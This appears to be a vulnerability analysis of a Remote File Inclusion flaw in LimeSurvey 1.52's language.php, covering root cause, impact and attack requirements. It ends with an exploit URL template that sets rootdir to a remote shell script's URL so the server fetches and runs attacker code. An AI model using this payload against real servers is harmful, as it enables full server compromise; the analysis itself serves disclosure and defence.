Based on the provided content, here's a breakdown of the vulnerability:

*   **Root cause of vulnerability**: The `language.php` file in LimeSurvey 1.52 is vulnerable to a Remote File Inclusion (RFI) vulnerability due to the insecure use of the `rootdir` parameter. The `require_once` function includes files based on user-controlled `rootdir` parameter.
*   **Weaknesses/vulnerabilities present**:
    *   **Remote File Inclusion (RFI):** The application allows an attacker to include remote files by manipulating the `rootdir` parameter in the URL.
*   **Impact of exploitation**:
    *   An attacker can include and execute arbitrary code from a remote server. This can lead to complete compromise of the vulnerable server, allowing the attacker to execute arbitrary commands, access sensitive data, or install malicious software.
*   **Attack vectors**:
    *   **HTTP GET Request:** The vulnerability can be exploited by sending a crafted HTTP GET request to the vulnerable `language.php` file, providing a malicious URL as the value of the `rootdir` parameter.
*   **Required attacker capabilities/position**:
    *   **Remote Access:** The attacker needs to have network access to the vulnerable LimeSurvey instance.
    *   **Malicious Server:** The attacker needs a server with an accessible file containing malicious code that will be included and executed by the vulnerable application.

The provided exploit code is: `http://[TARGET]/[PATH]/classes/core/language.php?rootdir=[-Sh3ll-]` where `[TARGET]` is replaced with the vulnerable server's address, `[PATH]` is the path to LimeSurvey and `[-Sh3ll-]`  is the URL to the malicious script.
